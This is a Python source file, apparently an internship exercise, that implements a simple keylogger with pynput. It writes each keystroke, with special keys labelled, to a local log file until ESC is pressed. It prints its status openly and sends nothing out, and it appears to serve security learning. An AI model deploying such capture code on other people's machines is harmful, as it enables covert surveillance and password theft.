# ============================================
# Simple Keylogger - CovalentX Internship
# Task 03 - Implement Simple Keylogger
# Author: Muntaha Ghafoor
# Purpose: Educational use only
# ============================================

from pynput import keyboard
from datetime import datetime
import os

# ---- Configuration ----
LOG_FILE = "keylog.txt"
STOP_KEY = keyboard.Key.esc  # Press ESC to stop

# ---- Write to log file ----
def write_to_file(data):
    with open(LOG_FILE, "a") as f:
        f.write(data)

# ---- Log session start ----
def start_session():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_to_file(f"\n\n{'='*50}\n")
    write_to_file(f"Session Started: {timestamp}\n")
    write_to_file(f"{'='*50}\n")
    print("="*50)
    print("   KEYLOGGER - CovalentX Internship Task 03")
    print("="*50)
    print(f"✅ Keylogger started at {timestamp}")
    print(f"📁 Saving keystrokes to: {os.path.abspath(LOG_FILE)}")
    print(f"⏹️  Press ESC to stop\n")

# ---- Handle key press ----
def on_press(key):
    try:
        write_to_file(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n[ENTER]\n")
        elif key == keyboard.Key.backspace:
            write_to_file("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            write_to_file("[TAB]")
        elif key == keyboard.Key.caps_lock:
            write_to_file("[CAPS LOCK]")
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            write_to_file("[SHIFT]")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            write_to_file("[CTRL]")
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            write_to_file("[ALT]")
        else:
            write_to_file(f"[{key}]")

# ---- Handle key release ----
def on_release(key):
    if key == STOP_KEY:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        write_to_file(f"\n\n{'='*50}\n")
        write_to_file(f"Session Ended: {timestamp}\n")
        write_to_file(f"{'='*50}\n")
        print(f"\n⏹️  Keylogger stopped at {timestamp}")
        print(f"📁 Keystrokes saved to: {os.path.abspath(LOG_FILE)}")
        return False

# ---- Main ----
def main():
    start_session()
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    main()